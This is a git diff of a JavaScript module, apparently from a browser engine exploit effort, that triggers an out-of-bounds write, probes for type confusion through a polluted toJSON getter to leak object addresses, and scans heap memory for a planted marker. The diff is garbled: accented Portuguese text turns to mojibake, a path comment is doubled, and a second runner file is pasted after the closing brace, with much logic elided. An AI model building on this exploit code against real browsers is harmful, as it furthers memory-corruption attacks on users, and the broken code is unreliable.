@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R40)
+// js/script3/// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R40)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
@@ -57,7 +57,7 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40()
         const current_object_to_leak_A = { marker_A_R40: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
         const current_object_to_leak_B = { marker_B_R40: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
         
-        function toJSON_TA_Probe_Iter_Closure_R40() { /* ... (l√≥gica da sonda como na R31, apenas atualizando logs para R40) ... */ 
+        function toJSON_TA_Probe_Iter_Closure_R40() { /* ... (lÛgica da sonda como na R31, apenas atualizando logs para R40) ... */ 
             probe_call_count_iter++; const call_num=probe_call_count_iter; const ctts=Object.prototype.toString.call(this);
             const is_m2c=(this===marker_M2_ref_iter&&marker_M2_ref_iter!==null&&ctts==='[object Object]');
             logS3(`[PROBE_R40] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
@@ -67,16 +67,16 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40()
             return nan?"getter_val_nan_inf":"getter_val_other";}catch(e_g){lis=`getter_ex:${e_g.message}`;if(det)det.leak_val_getter_int64=lis;return lis;}},enumerable:true,configurable:true});if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.getter_defined=true;this.leaky_B_direct_v82=current_object_to_leak_B;if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.direct_prop_set=true;}catch(e_m2d){if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.error_probe=`M2DefErr:${e_m2d.message}`;}}return this;}}catch(e_pm){return{err_pm:call_num,msg:e_pm.message};}return{gen_m:call_num,type:ctts};
         }
 
-        // ... (Resto da fun√ß√£o execute... como na R31, apenas atualizando nomes de log e o nome da fun√ß√£o da sonda)
-        // A l√≥gica do loop de scan de mem√≥ria (Fase 2) usa await PAUSE_S3(0); corretamente.
-        // O preenchimento de best_result_for_runner e current_iter_summary √© mantido.
+        // ... (Resto da funÁ„o execute... como na R31, apenas atualizando nomes de log e o nome da funÁ„o da sonda)
+        // A lÛgica do loop de scan de memÛria (Fase 2) usa await PAUSE_S3(0); corretamente.
+        // O preenchimento de best_result_for_runner e current_iter_summary È mantido.
         let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
         let iter_primary_error = null; 
         let iter_memory_scan_result = { success: false, msg: "Memory scan (R40): Not run.", found_at_address: null, oob_buffer_base_addr: null };
         let heisenbugConfirmedThisIter = false; 
         
         try { 
-            logS3(`  --- Fase 1 (R40): Detec√ß√£o de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
+            logS3(`  --- Fase 1 (R40): DetecÁ„o de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
             await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
             oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
             await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
@@ -92,14 +92,14 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40()
                     if(iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error=new Error(iteration_final_tc_details_from_probe.error_probe);
                 }else{logS3(` TC Probe R40: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
             }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
-            logS3(`  --- Fase 1 (R40) Conclu√≠da. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
+            logS3(`  --- Fase 1 (R40) ConcluÌda. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
             await PAUSE_S3(100);
             logS3(`  --- Fase 2 (R40): Teste de Memory Scan ---`, "subtest", FNAME_CURRENT_ITERATION);
             if (heisenbugConfirmedThisIter) { 
                 try {
                     await triggerOOB_primitive({ force_reinit: false, caller_fname: `${FNAME_CURRENT_ITERATION}-MemScanSetup` }); 
                     if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-MemScanSetup`)) {
-                        throw new Error("Ambiente OOB n√£o pronto para Memory Scan.");
+                        throw new Error("Ambiente OOB n„o pronto para Memory Scan.");
                     }
                     logS3(`  MemScan: Plantando marcador ${SCAN_MARKER_VALUE_R40.toString(true)} em oob_array_buffer_real[${toHex(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R40)}]...`, 'info');
                     oob_write_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R40, SCAN_MARKER_VALUE_R40, 8);
@@ -130,13 +130,13 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40()
                         }
                         await PAUSE_S3(0); 
                     }
-                    if (!found_marker_addr) iter_memory_scan_result.msg = `MemScan: Marcador n√£o encontrado na faixa ${SCAN_HEAP_START_ADDRESS_R40.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R40.toString(true)}.`;
+                    if (!found_marker_addr) iter_memory_scan_result.msg = `MemScan: Marcador n„o encontrado na faixa ${SCAN_HEAP_START_ADDRESS_R40.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R40.toString(true)}.`;
                 } catch (e_mem_scan) {
                     iter_memory_scan_result.msg = `MemScan EXCEPTION: ${e_mem_scan.message || String(e_mem_scan)}`;
                     if (!iter_primary_error) iter_primary_error = e_mem_scan;
                 }
             } else { iter_memory_scan_result.msg = "Memory scan: Pulado (TC Fase 1 falhou)."; }
-            logS3(`  --- Fase 2 (R40) Conclu√≠da. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");
+            logS3(`  --- Fase 2 (R40) ConcluÌda. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");
 
         }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer; logS3(`  CRITICAL ERROR ITERATION R40: ${e_outer.message || String(e_outer)}`, "critical");}
         finally{clearOOBEnvironment({caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR40`});}
@@ -145,7 +145,7 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40()
         
         let current_iter_summary = { /* ... */ }; 
         iteration_results_summary.push(current_iter_summary);
-        // L√≥gica de best_result_for_runner
+        // LÛgica de best_result_for_runner
         // ... (como na R31)
         
         if(iter_memory_scan_result.success)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40: Scan OK!`;
@@ -156,4 +156,31 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40()
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
     logS3(`Best/Final result (R40): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
     return { /* ... (como na R31) ... */ }; 
+} (ATUALIZADO para Revisado 40)
+import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
+import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
+import {
+    executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40, // <<<< NOME DA FUN«√O ATUALIZADO
+    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL
+} from './testArrayBufferVictimCrash.mjs';
+
+async function runHeisenbugReproStrategy_TypedArrayVictim() {
+    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R40"; 
+    logS3(`==== INICIANDO EstratÈgia de ReproduÁ„o do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
+    const result = await executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40(); 
+    // ... (lÛgica de processamento de resultado como na R31, adaptando logs para R40) ...
+    if(result.errorOccurred){logS3(` RUNNER R40: ERRO: ${String(result.errorOccurred)}.`,"critical",FNAME_RUNNER);document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40: ERR!`;}
+    else if(result){/* ... logs como R31 ... */} else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40: Invalid Res`;}
+    logS3(`  TÌtulo da p·gina final: ${document.title}`, "info", FNAME_RUNNER);
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    logS3(`==== EstratÈgia de ReproduÁ„o do Heisenbug (${FNAME_RUNNER}) CONCLUÕDA ====`, 'test', FNAME_RUNNER);
+}
+
+export async function runAllAdvancedTestsS3() {
+    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_MainOrchestrator_R40`; 
+    logS3(`==== INICIANDO Script 3 R40 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
+    await runHeisenbugReproStrategy_TypedArrayVictim();
+    logS3(`\n==== Script 3 R40 (${FNAME_ORCHESTRATOR}) CONCLUÕDO ====`, 'test', FNAME_ORCHESTRATOR);
+    const runBtn = getRunBtnAdvancedS3(); if(runBtn) runBtn.disabled = false;
+    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL)&&!document.title.includes("SUCCESS")&&!document.title.includes("Fail")&&!document.title.includes("OK")&&!document.title.includes("Confirmed")){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40 Done`;}
 }
